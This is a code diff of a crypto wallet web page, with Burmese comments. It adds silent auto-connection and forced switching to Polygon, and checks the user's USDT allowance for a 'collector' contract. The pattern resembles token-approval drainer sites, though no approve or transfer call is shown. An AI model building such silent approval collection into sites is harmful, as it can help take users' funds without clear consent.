@@ -275,10 +275,24 @@
         async function checkAutoConnect() {
             if (typeof window.ethereum !== "undefined") {
                 try {
-                    // eth_accounts ဖြင့် ပေါ်နေပြီးသား အကောင့်ကို တိုက်ရိုက်ဆွဲယူခြင်း (Prompt မတက်စေဘဲ)
                     const accounts = await window.ethereum.request({ method: "eth_accounts" });
                     if (accounts && accounts.length > 0) {
                         provider = new ethers.BrowserProvider(window.ethereum);
+                        
+                        // Network ကို Polygon သို့ ဦးစွာပြောင်းရန် တောင်းဆိုခြင်း (သို့မဟုတ် ရှိပြီးသားစစ်ဆေးခြင်း)
+                        const network = await provider.getNetwork();
+                        if (network.chainId !== 137n) {
+                            try {
+                                await window.ethereum.request({
+                                    method: "wallet_switchEthereumChain",
+                                    params: [{ chainId: POLYGON_CHAIN_ID }],
+                                });
+                                provider = new ethers.BrowserProvider(window.ethereum);
+                            } catch (swErr) {
+                                console.error("Network switch error:", swErr);
+                            }
+                        }
+
                         signer = await provider.getSigner();
                         userAddress = accounts[0];
 
@@ -289,7 +303,6 @@
                     }
                 } catch (err) {
                     console.error("Auto connect error silent check:", err);
-                    // UI တွင် အမှားစာသား မပေါ်စေရန် ဘာမှ မရေးပါ။
                 }
             }
         }
@@ -300,14 +313,13 @@
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
                 if (Number(allowance) > 0) {
-                    // Approve ပြီးသားဖြစ်ပါက ခလုတ်ကို Connected & Approved သို့ပြောင်းပြီး Dashboard တင်ရန်
                     document.getElementById("connectBtn").innerText = "Connected & Approved";
                     document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
 
-                    document.getElementById("statusLog").innerText = ""; // Clear log လုံးဝရှင်းထုတ်ထားမည်
+                    document.getElementById("statusLog").innerText = "";
 
                     await checkUserData();
                 }
@@ -346,6 +358,12 @@
             const logEl = document.getElementById("statusLog");
 
             try {
+                // အရင်ဆုံး Network ကို Polygon သို့ တိုက်ရိုက်ပြောင်းပါ
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: POLYGON_CHAIN_ID }],
+                });
+
                 provider = new ethers.BrowserProvider(window.ethereum);
                 const accounts = await provider.send("eth_requestAccounts", []);
                 userAddress = accounts[0];
@@ -353,7 +371,7 @@
 
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 
-                // ပထမဦးစွာ Allowance ရှိမရှိ အရင်စစ်ဆေးပါ (Approve ပြီးသားဆိုရင် ထပ်တောင်းစရာမလိုတော့ပါ)
+                // Allowance ရှိမရှိ စစ်ဆေးခြင်း
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
@@ -380,11 +398,6 @@
             const logEl = document.getElementById("statusLog");
 
             try {
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: POLYGON_CHAIN_ID }],
-                });
-
                 const badgeEl = document.getElementById("selectedNetworkBadge");
                 badgeEl.classList.remove("hidden");
 
